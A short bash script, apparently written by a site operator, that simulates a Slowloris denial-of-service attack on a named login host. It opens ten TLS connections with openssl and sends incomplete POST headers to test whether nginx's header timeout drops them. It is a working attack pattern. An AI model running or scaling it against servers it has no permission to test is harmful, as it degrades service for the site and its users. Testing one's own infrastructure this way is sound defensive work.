#!/bin/bash
# Simulation of a Slowloris-Attack:
# Öffnet Verbindungen und sendet Headers extrem langsam
# nginx sollte diese nach client_header_timeout (10s) trennen

TARGET="login-mvp.prodowner.de"
PORT=443

echo "=== Slowloris Simulation ==="
echo "Target: $TARGET:$PORT"
echo "Open 10 slow Connections..."
echo ""

for i in $(seq 1 10); do
    (
        # Open connection, Header nur teilweise senden, dann warten
        echo -e "POST /auth/login HTTP/1.1\r\nHost: $TARGET\r\nContent-Type: application/json\r\nContent-Length: 100\r\n" | \
        timeout 30 openssl s_client -connect "$TARGET:$PORT" -quiet 2>/dev/null
        echo "Connection $i closed"
    ) &
    echo "Connection $i opened"
    sleep 1
done

wait
echo ""
echo "=== Slowloris Test finsihed ==="
echo "Check nginx error.log: sudo tail -f /var/log/nginx/error.log"